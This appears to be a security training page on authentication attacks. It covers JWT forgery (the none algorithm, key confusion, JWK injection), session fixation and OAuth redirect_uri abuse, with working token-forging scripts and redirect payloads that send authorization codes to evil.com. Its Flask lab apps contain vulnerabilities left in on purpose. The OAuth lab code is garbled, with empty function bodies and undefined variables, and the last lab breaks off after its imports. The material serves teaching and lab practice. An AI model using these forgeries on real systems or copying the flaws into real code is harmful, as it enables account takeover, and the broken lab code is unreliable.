Authentication Attacks

JWT Attacks

JSON Web Tokens: header.payload.signature (Base64url-encoded). Attacks target the signature verification logic.

None Algorithm

Change "alg" to "none" and remove the signature. Works if the server doesn't enforce algorithm validation.

import base64, json

# Original token: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIGNATURE

# Forge token with alg: none
header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user": "admin"}).encode()).rstrip(b'=')
forged = header.decode() + '.' + payload.decode() + '.'
print(forged)
# Also try variations:
# "alg": "None", "alg": "NONE", "alg": "nOnE"
# Some libraries accept these case variants

Key Confusion (RS256 → HS256)

If the server uses RS256 (asymmetric) but accepts HS256 (symmetric), sign with the public key as the HMAC secret.

import jwt

# 1. Obtain the server's public key (/.well-known/jwks.json, /public.pem, etc.)
with open('public.pem', 'r') as f:
    public_key = f.read()

# 2. Sign with public key using HS256
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
print(token)
# jwt_tool automation
python3 jwt_tool.py TOKEN -X k -pk public.pem

JWK Header Injection

Embed your own public key in the token's jwk header parameter. If the server uses the embedded key for verification, you control signing.

from jwcrypto import jwk, jwt as jwcrypto_jwt
import json

# Generate a new RSA key pair
key = jwk.JWK.generate(kty='RSA', size=2048)

# Create token with embedded JWK
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": json.loads(key.export_public())
}
claims = {"user": "admin", "role": "admin"}

token = jwcrypto_jwt.JWT(header=header, claims=claims)
token.make_signed_token(key)
print(token.serialize())

Session Fixation

Attacker sets the victim's session ID before authentication. If the server doesn't regenerate the session after login, the attacker shares the session.

# 1. Attacker gets a valid session ID
curl -c cookies.txt https://target.com/login

# 2. Attacker sends victim a URL with the fixed session
https://target.com/login?PHPSESSID=attacker_known_session

# 3. Victim logs in — session ID doesn't change
# 4. Attacker uses the same session ID — now authenticated

OAuth / OIDC Attacks

redirect_uri Manipulation

If the OAuth provider doesn't strictly validate redirect_uri, the authorization code or token can be sent to an attacker-controlled URL.

# Original flow
https://auth.target.com/authorize?client_id=APP&redirect_uri=https://app.com/callback&response_type=code

# Attack: modify redirect_uri
https://auth.target.com/authorize?client_id=APP&redirect_uri=https://evil.com/steal&response_type=code

# Bypass variations when partial matching is used
redirect_uri=https://app.com.evil.com/callback
redirect_uri=https://app.com@evil.com/callback
redirect_uri=https://app.com%40evil.com/callback
redirect_uri=https://evil.com/?.app.com
redirect_uri=https://app.com/callback/../../../evil.com

Missing State Parameter

Without state, the OAuth flow is vulnerable to CSRF — attacker can link their own OAuth account to a victim's account.

# Attack: initiate OAuth flow, get the callback URL with auth code

# Victim's browser completes the flow — attacker's OAuth account linked to victim

Lab 1: JWT None Algorithm Bypass

Easy

Objective: Forge a JWT to gain admin access by exploiting the none algorithm vulnerability.

# app.py — JWT none algorithm lab
from flask import Flask, request, jsonify
import jwt, json, base64

app = Flask(__name__)
SECRET = 'super_secret_key_123'

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username', 'guest')
    token = jwt.encode({"user": user, "role": "user"}, SECRET, algorithm="HS256")
    return jsonify({"token": token})

@app.route('/admin')
def admin():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if not token:
        return jsonify({"error": "No token"}), 401
    try:
        # Vulnerable: doesn't enforce algorithm
        parts = token.split('.')
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        if header.get('alg', '').lower() == 'none':
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        else:
            payload = jwt.decode(token, SECRET, algorithms=["HS256"])
        if payload.get('role') == 'admin':
            return jsonify({"message": "Welcome admin!", "secret": "admin_panel_data_here"})
        return jsonify({"message": f"Hello {payload.get('user')}, you are not admin"}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 401

app.run(debug=True)

Tasks:

  1. Login as guest: curl -X POST http://localhost:5000/login -d "username=guest"
  2. Decode the returned JWT — inspect the header and payload
  3. Craft a new JWT with {"alg":"none"} and {"user":"admin","role":"admin"}
  4. Send the forged token: curl -H "Authorization: Bearer FORGED_TOKEN" http://localhost:5000/admin

# app.py — OAuth redirect_uri lab
from flask import Flask, request, redirect, session, jsonify
import secrets, urllib.parse

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Simulated OAuth provider
AUTH_CODES = {}
VALID_CLIENT = 'webapp'

@app.route('/oauth/authorize')
def authorize():

    redirect_uri = request.args.get('redirect_uri', '')

    # Vulnerable: only checks if redirect_uri STARTS with allowed domain
    allowed_prefix = 'http://localhost:5000/'

    return redirect(f'{redirect_uri}?code={code}&state={state}')

@app.route('/callback')
def callback():

@app.route('/oauth/token', methods=['POST'])
def token():
    code = request.form.get('code', '')
    if code in AUTH_CODES:
        user_data = AUTH_CODES.pop(code)
        return jsonify({"access_token": "FLAG{oauth_redirect_uri_bypass}", "user": user_data['user']})
    return jsonify({"error": "invalid_code"}), 400

# Open redirect on the same domain (exploitable)
@app.route('/redirect')
def open_redir():

# app.py — JWT jku spoofing
from flask import Flask, request, jsonify
import jwt, requests as req, json
from jwcrypto import jwk as jwk_lib

app = Flask(__name__)
